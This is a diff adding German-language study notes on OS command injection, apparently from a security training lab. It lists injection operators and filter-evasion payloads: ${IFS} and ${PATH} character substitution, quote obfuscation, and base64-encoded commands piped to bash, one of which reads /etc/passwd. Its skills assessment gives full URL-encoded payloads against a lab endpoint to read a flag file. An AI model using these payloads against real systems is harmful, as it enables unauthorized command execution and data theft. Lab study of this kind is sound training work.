@@ -1,0 +1,142 @@
+Command Injections
+Intro to Command Injections:
+- Eine Command Injection Schwachstelle ermoeglicht es uns Befehle auf dem System auszufuehren
+- Es gibt mehrere Typen von Injection Schwachstellen:
+	- OS Injection
+	- XSS Injection
+	- PHP Injection
+	- Code Injection
+##############################################################################################
+Exploitation
+1. Detection:
+- Wir muessen verschiedene Befehle ausprobieren um den richtigen Befehl zu bekommen
+- Es gibt verschiedene Methoden um eine neuen Befehl einzuschleusen wie ;, \n, &, | usw
+
+2. Injecting Commands:
+- Es kommt haeufig vor das der Input nur am Front-End ueberprueft wird dies kann ueberprueft werden ob ein Request gesendet wird
+- Eine Front-End Ueberpruefung kann leicht umgangen werden
+
+3. Other Injection Operators:
+- AND Operator:
+	- Wir koennen mit einem & zwei Befehle ausfuehren
+	- ping -c 1 127.0.0.1 && whoami
+	- Hier werden beide Befehle ausgegeben
+
+- OR Operator:
+	- Mit dem Oder Operator || wird der zweite der beiden Befehle ausgegeben
+	- ping -c 1 || whoami
+	- Hier wird nur der letzte Befehl ausgegeben
+
+##############################################################################################
+Filter Evasion
+1. Identifiying Filters:
+- Manche Zeichen sind im Backend geblacklisted
+- Diese Zeichen muessen wir austesten
+- URL encoding nicht vergessen 
+
+2. Bypassing Space Filter:
+- Manchmal werden Spaces danach noch rausgefiltert
+- Manchmal koennen wir Tabs verwenden um Leerzeichen zu ersetzen als URL encoded(%09)
+- Auf einem Linux System koennen wir $IFS verwenden $IFS ist der Ersatz fuer Spaces und Tabs
+- Wir koennen Leerzeichen durch {$IFS} auf Linux Zielsystem ersetzen
+- Ausserdem koennen wir {ls,-la} verwenden welches automatisch Leerzeichen zwischen Argumenten setzt
+
+3. Bypassing Other Blacklisted Characters:
+- Ein haeufiges Leerzeichen ist / oder \
+
+- Linux:
+	- Fuer Slash oder Backslash gibt es keinen Ersatz wie ${IFS}
+	- ${PATH:0:1} wird ein Slash ausgeben
+	- ${LS_COLORS:10:1} wird ein Semikolon ausgegeben
+
+- Windows:
+	- %HOMEPATH:~6,-11% gibt ein \ in CMD aus
+	- $env:HOMEPATH[0] gibt ein \ in PowerShell aus
+
+- Character Shifting:
+	- Wir koennen Zeichen in Linux shiften
+	- Mit man ascii kann eine ASCII Tabelle ausgeben werden
+
+- Question:
+	- ip=127.0.0.1%0als${IFS}${PATH:0:1}home
+
+4. Bypassing Blacklisted Commands:
+- Manchmal sind Befehle geblacklistet
+
+- Linux & Windows:
+	- Wir koennen Befehle leicht obfuskieren indem wir einzelne Zeichen mit ' oder " versehen
+	- Die Anzahl der Anfuehrungsstriche muss grade sein und die Anfuehrungsstriche duerfen sich nicht unterscheiden
+	- w'h'o'am'i
+	- w"h"o"am"i
+
+- Linux only:
+	- Wir koennen ein bashslash \ und $@ in unseren Befehl einfuegen um den Befehl zu obfuskieren
+	- Die Anzahl muss nicht gerade sein
+	- who$@ami oder w\ho\am\i
+
+- Windows only:
+	- In Windows koennen wir ^ verwenden 
+
+- Question:
+	- ip=127.0.0.1%0a'c'a't'${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
+
+5. Advanced Command Obfuscation:
+- Manchmal werden erweiterte Filter angewendet wie Web Application Firewalls(WAFs)
+
+- Case Manipulation:
+	- Manchmal koennen wir die Befehle mit Gross- oder Kleinbuchstaben schreiben in Linux wird das nicht funktionieren, da in Linux Befehle nur klein geschrieben werden
+	- In CMD oder PowerShell funktioniert diese Methode ganz normal mit WhOAmi
+	- In Linux muessen wir dies erweitern
+	- $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+	- Hier muessen wir wenn Leerzeichen auch gefiltert werden mit %09 ersetzt werden
+
+- Reverse Commands:
+	- Wir koennen ein Befehl rueckwaerts ausfuehren mit dem Befehl rev unter Linux
+	- $(rev<<<'imaohw')
+	- Das gleiche koennen wir auch fuer Windows ausfuehren iex "$('imaohw'[-1..-20] -join '')"
+
+- Encoded Commands:
+	- Manchmal muessen die Befehle encoded werden mit Base64 usw
+	
+	- Linux:
+		- echo -n 'cat /etc/passwd | grep 33' | base64
+		- bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+		- Mit <<<< ersetzten wir |
+	
+	- Windows:
+		- [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+		- echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+		- iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+
+- Question:
+	- ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
+
+6. Evasion Toosl:
+- Bei komplexeren Tools koennen wir automatische Tools verwenden
+
+- Linux(Bashfuscator):
+	- Unter Linux gibt es Bashfuscator dieses Tool erstellt ein zufallig generierten Payload 
+	- Mit -c geben wir den Befehl an
+	- Mit bash -c koennen wir das Payload testen
+
+- Windows(DOSfuscation):
+	- Mit DOSfuscation koennen wir einen Payload in Windows erzeugen
+	- Nachdem DOSfuscation ausgefuehrt ist koennen wir mit SET Command unseren Befehl setzen
+	- Mit encoding starten wir den Prozess
+	- Den Payload koennen wir in CMD eingeben und testen
+
+##############################################################################################
+Skills Assessment:
+- What is the content of '/flag.txt'?
+cat
+- mv ${PATH:0:1}flag.txt ${PATH:0:1}var${PATH:0:1}www${PATH:0:1}html${PATH:0:1}tmp
+- BASE64: bXYgJHtQQVRIOjA6MX1mbGFnLnR4dCAke1BBVEg6MDoxfXZhciR7UEFUSDowOjF9d3d3JHtQQVRIOjA6MX1odG1sJHtQQVRIOjA6MX10bXA=
+- %7c%7cbash<<<$(base64%09-d<<<bXYgJHtQQVRIOjA6MX1mbGFnLnR4dCAke1BBVEg6MDoxfXZhciR7UEFUSDowOjF9d3d3JHtQQVRIOjA6MX1odG1sJHtQQVRIOjA6MX10bXA=)
+
+- http://143.110.162.231:32339/index.php?to=%7c%7cbash%3C%3C%3C$(base64%09-d%3C%3C%3CbXYgJHtQQVRIOjA6MX1mbGFnLnR4dCAke1BBVEg6MDoxfXZhciR7UEFUSDowOjF9d3d3JHtQQVRIOjA6MX1odG1sJHtQQVRIOjA6MX10bXA=)&from=877915113.txt
+
+- cat ${PATH:0:1}flag.txt
+- BASE64: Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQ=
+- %7c%7cbash<<<$(base64%09-d<<<Y2F0ICR7UEFUSDowOjF9ZmxhZy50eHQ=)
+
+- http://143.110.162.231:32339/index.php?to=%7c%7cbash%3C%3C%3C$(base64%09-d%3C%3C%3CY2F0ICR7UEFUSDowOjF9ZmxhZy50eHQ=)&from=877915113.txt
